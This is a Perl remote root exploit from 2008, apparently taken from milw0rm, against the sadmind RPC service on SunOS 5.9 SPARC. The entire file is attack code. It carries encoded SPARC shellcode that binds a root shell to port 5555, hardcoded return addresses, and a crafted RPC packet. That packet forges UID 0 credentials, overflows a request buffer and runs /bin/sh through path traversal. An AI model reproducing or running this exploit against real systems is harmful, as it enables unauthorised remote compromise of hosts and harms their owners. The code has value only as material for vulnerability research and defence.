#!/usr/bin/perl
# holygrail2                                                                      #
#---------------------------------------------------------------------------------#
# SunOS 5.9 [UltraSPARC] sadmind Remote Root Exploit by KingCope in 2008          #
#                                                                                 #
# Most of work was shamelessy ripped from HD-Moore  and RISE-Security exploits!!! #
# Bug found by RISE-Security.                                                     #
# Sparc exploit by KingCope [kcope2@googlemail.com]                               #
# Maybe I will extend this to Solaris 8/10/11 in futura ??                        #
# thanks to alex,andi,adize ...                                                   #
#                                                                                 #
###################################################################################

use strict;
use POSIX;
use IO::Socket;
use IO::Select;

print "holygrail2 vs. SunOS 5.9 sadmind\nby kcope in 2008\nbinds a shell to port 5555\n";
my $host = $ARGV[0];

if ($host eq "") {
	print "usage: perl holygrail2.pl <address>\n";
	exit(-1);
}

# solaris_sparc_bind -  LPORT=5555 Size=232 Encoder=Sparc http://metasploit.com
my $payload =
"\x23\x32\xde\xd7\xa2\x14\x62\x6f\x20\xbf\xff\xff\x20\xbf\xff\xff".
"\x7f\xff\xff\xff\xea\x03\xe0\x20\xaa\x9d\x40\x11\xea\x23\xe0\x20".
"\xa2\x04\x40\x15\x81\xdb\xe0\x20\x12\xbf\xff\xfb\x9e\x03\xe0\x04".
"\x57\x50\xfe\x68\xff\xb6\xde\x77\x69\xad\xde\x7c\x01\xcb\x1e\x89".
"\xbb\xfc\xbe\x8f\x2b\xec\x9e\x8d\xce\x1c\xfe\x77\x5f\xcc\xdf\x7f".
"\x8f\xce\xa0\x87\x11\x10\xdf\xf2\xf1\x04\xfe\x4f\x11\x06\xbe\x5f".
"\x11\x6b\x7e\x6b\x03\x4f\x21\x83\xb7\x80\x01\xb3\x35\xb0\x61\x5b".
"\xa8\x60\x42\x93\x1b\x83\x3d\x5b\x09\x94\x62\x9a\xaf\x84\x42\x75".
"\x3e\x74\xa3\x8d\x91\x77\x1c\x75\x83\x62\x23\x8c\x37\x80\xe3\x87".
"\xb5\xb4\xc3\x7d\x28\x65\x24\x89\x9b\xa6\x9b\x71\x8f\xb8\xc4\x82".
"\x3d\xa9\x24\x8d\xd5\x6b\x84\x8c\x54\x7b\xe4\xb0\xc9\xab\xc4\xc4".
"\xf8\xf3\xfb\x28\x2d\x0f\xbb\x28\x59\x15\x04\xc3\x40\x21\x5c\x49".
"\x22\x22\x7c\x03\x01\x41\xa2\x01\xd5\x75\xfb\xa5\x47\x5a\x5b\xcd".
"\x87\xa6\x24\x3d\x97\xfa\xe4\x45\xd7\xde\xa4\x49\x5a\x30\xfb\x8a".
"\xcb\xe0\xdb\xe4\xec\x01\x1b\xf4";

my $patchaddr = pack("N", 0xffbf83d8);
my $retaddr = pack("N", 0xffbf88e0);

sub nonblock {
    my ($fd) = @_;
    my $flags = fcntl($fd, F_GETFL,0);
    fcntl($fd, F_SETFL, $flags|O_NONBLOCK);
}

sub rpc_read {
    my ($s) = @_;
    my $sel = IO::Select->new($s);
    my $res;
    my @fds = $sel->can_read(4);
    foreach (@fds) { $res .= <$s>; }
    return $res;
}

sub rpc_getport {
    my ($target_host, $target_port, $prog, $vers) = @_;
    
    my $s = rpc_socket($target_host, $target_port);

    my $portmap_req =
        
        pack("L", rand() * 0xffffffff) . # XID
        "\x00\x00\x00\x00".              # Call
        "\x00\x00\x00\x02".              # RPC Version
        "\x00\x01\x86\xa0".              # Program Number  (PORTMAP)
        "\x00\x00\x00\x02".              # Program Version (2)
        "\x00\x00\x00\x03".              # Procedure (getport)
        ("\x00" x 16).                   # Credentials and Verifier
        pack("N", $prog) .
        pack("N", $vers).
        pack("N", 0x11).                 # Protocol: UDP
        pack("N", 0x00);                 # Port: 0

    print $s $portmap_req;

    my $r = rpc_read($s);
    close ($s);
    
    if (length($r) == 28) 
    { 
        my $prog_port = unpack("N",substr($r, 24, 4));
        return($prog_port); 
    }
    
    return undef;
}

sub rpc_socket {
    my ($target_host, $target_port) = @_;
    my $s = IO::Socket::INET->new
    (
        PeerAddr => $target_host, 
        PeerPort => $target_port,
        Proto    => "udp",
        Type     => SOCK_DGRAM
    );

    if (! $s)
    {
        print "\nError: could not create socket to target: $!\n";
        exit(0);
    }

    select($s); $|++;
    select(STDOUT); $|++;
    nonblock($s);
    return($s);
}

sub rpc_sadmin_expl {
    my ($hostname, $command, $first) = @_;
    my $packed_host = $hostname . ("\x00" x (59 - length($hostname)));    
    
    my $rpc =
        pack("L", rand() * 0xffffffff) . # XID
        "\x00\x00\x00\x00".              # Call
        "\x00\x00\x00\x02".              # RPC Version
        "\x00\x01\x87\x88".              # Program Number  (SADMIND)
        "\x00\x00\x00\x0a".              # Program Version (10)
        "\x00\x00\x00\x01".              # Procedure
        "\x00\x00\x00\x01";              # Credentials (UNIX)
                                         # Auth Length is filled in

    # pad it up to multiples of 4
    my $rpc_hostname = $hostname;
    while (length($rpc_hostname) % 4 != 0) { $rpc_hostname .= "\x00" }
    
    my $rpc_auth =
        # Time Stamp
        pack("N", time() + 20001) .

        # Machine Name
        pack("N", length($hostname)) . $rpc_hostname .

        "\x00\x00\x00\x00".              # UID = 0
        "\x00\x00\x00\x00".              # GID = 0
        "\x00\x00\x00\x00";              # No Extra Groups  


    $rpc .= pack("N", length($rpc_auth)) . $rpc_auth . ("\x00" x 8);

    my $fp = pack("N", 0xffbf9108);
    my $buf1 = "\x90" x (2050-length($payload)-500) . $payload . "\x90\x90" . "\x90" x 500 . "CC" . $fp . $fp . $retaddr x 100;

    if ($first eq 1) {
	$buf1 = "\x90" x 50;
    }

    while (length($buf1) % 4 != 0) { $buf1 .= "\x00" }

    my $header =
    
    # Another Time Stamp
    reverse(pack("L", time() + 20005)) .

    "\x00\x07\x45\xdf".
    
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06".
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
    "\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x04".
    
    "\x7f\x00\x00\x01".                 # 127.0.0.1
    "\x00\x01\x87\x88".                 # SADMIND
    
    "\x00\x00\x00\x0a\x00\x00\x00\x04".
    
    "\x7f\x00\x00\x01".                 # 127.0.0.1
    "\x00\x01\x87\x88".                 # SADMIND

    "\x00\x00\x00\x0a\x00\x00\x00\x11\x00\x00\x00\x1e".
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
    "\x00\x00\x00\x00".

    "\x00\x00\x00\x3b". $packed_host.

    "\x00\x00\x00\x00\x06" . "system".
    
    "\x00\x00\x00\x00\x00\x15". "../../../../../bin/sh". "\x00\x00\x00";
    
    # Append Body Length ^-- Here

    my $body = 
    "\x00\x00\x00\x0e". "ADM_FW_VERSION".
    "\x00\x00\x00\x00\x00\x03\x00\x00\x00\x04\x00\x00".
    "\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00".
    
    "\x00\x00\x00\x08". "ADM_LANG".
    "\x00\x00\x00\x09\x00\x00\x00\x02\x00\x00".
    "\x00\x01". "C" . 
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
    
    "\x00\x00\x00\x0d". "ADM_REQUESTID".
    "\x00\x00\x00\x00\x00\x00\x09\x00\x00\x00\x12\x00\x00\x00\x11".
    "00009:000000000:0"."\x00\x00\x00".
    "\x00\x00\x00\x00\x00\x00\x00\x00".

    "\x00\x00\x00\x09". "ADM_CLASS".
    "\x00\x00\x00\x00\x00\x00\x09\x00\x00\x00\x07".
    "\x00\x00\x00\x06" . "system" .
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
    
    
    "\x00\x00\x00\x0e" . "ADM_CLASS_VERS" .
    "\x00\x00\x00\x00\x00\x09\x00\x00\x00\x04".
    "\x00\x00\x00\x03". "2.1".
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00".
    
    
    "\x00\x00\x00\x0a" . "ADM_METHOD" . 
    "\x00\x00\x00\x00\x00\x09" . pack("N", length($buf1)+1) . pack("N", length($buf1)) . $buf1 . 
    "\x00\x00\x00\x00\x00\x00\x00\x00".
    
    "\x00\x00\x00\x08". "ADM_HOST" .
    "\x00\x00\x00\x09\x00\x00\x00\x3c\x00\x00\x00\x3b".
    $packed_host.

    "\x00\x00\x00\x00\x00\x00\x00\x00\x00".
    "\x00\x00\x00\x0f". "ADM_CLIENT_HOST".
    "\x00\x00\x00\x00\x09".
    
    pack("N", length($hostname) + 1) .
    pack("N", length($hostname)) .
    $rpc_hostname .
    "\x00\x00\x00\x00". "\x00\x00\x00\x00".
    
    "\x00\x00\x00\x11" . "ADM_CLIENT_DOMAIN".
    "\x00\x00\x00\x00\x00\x00\x09\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00".
    "\x00\x00\x00\x00\x00\x00".
    
    "\x00\x00\x00\x11" . "ADM_TIMEOUT_PARMS".
    "\x00\x00\x00\x00\x00".
    "\x00\x09\x00\x00\x00\x1c".
    "\x00\x00\x00\x1b" . "TTL=0 PTO=20 PCNT=2 PDLY=30".
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00".
    
    
    "\x00\x00\x00\x09" . "ADM_FENCE" .
    "\x00\x00\x00\x00\x00\x00\x09\x00\x00\x00\x00\x00\x00\x00\x00\x00".
    "\x00\x00\x00\x00\x00\x00\x01\x58\x00\x00\x00\x00\x00\x00\x09\x00".
    "\x00\x00\x03\x00\x00\x00\x02" . "-c" .
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x59\x00".
    "\x00\x00\x00\x00\x00\x09\x00\x00\x02\x01\x00\x00\x02\x00".

    $command . ("\x00" x (512 - length($command))).

    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10".
    "netmgt_endofargs";

    my $res = $rpc . $header . pack("N", (length($body) + 4 + length($header)) - 330) . $body;

    return($res);

}

$|=1;

my $portmap = "111";
for (my $i=1;$i<3;$i++) {
my $target_port = rpc_getport($host, $portmap, 100232, 10);
if (! $target_port)
{
    print STDERR "Error: could not determine port used by sadmind\n";
    exit(0);
}

my $s = rpc_socket($host, $target_port);
my $x = rpc_sadmin_expl("localhost", "foo", $i);
print $s $x;
my $r = rpc_read($s);
close ($s);
}

# milw0rm.com [2008-10-19]
